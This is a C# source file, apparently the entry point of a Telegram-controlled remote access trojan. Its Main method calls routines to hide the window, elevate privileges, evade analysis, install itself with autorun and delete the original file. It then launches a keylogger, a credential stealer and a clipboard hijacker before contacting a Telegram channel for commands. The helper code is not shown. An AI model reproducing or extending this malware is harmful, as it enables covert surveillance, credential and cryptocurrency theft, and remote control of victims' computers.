using System;
using System.Net;
using System.Windows.Forms;

namespace TelegramRAT;

internal class Program
{
	[STAThread]
	private static void Main(string[] args)
	{
		persistence.HideConsoleWindow();
		persistence.CheckMutex();
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
		persistence.elevatePrevileges();
		persistence.Sleep();
		persistence.runAntiAnalysis();
		persistence.installSelf();
		persistence.setAutorun();
		persistence.MeltFile();
		utils.isConnectedToInternet();
		persistence.processCheckerThread.Start();
		utils.keyloggerThread.Start();
		AutoStealer.AutoStealerThread.Start();
		Clipper.Run();
		persistence.protectProcess();
		persistence.PreventSleep();
		telegram.sendConnection();
		telegram.waitCommandsThread.Start();
		Application.Run((Form)(object)new persistence.MainForm());
	}
}
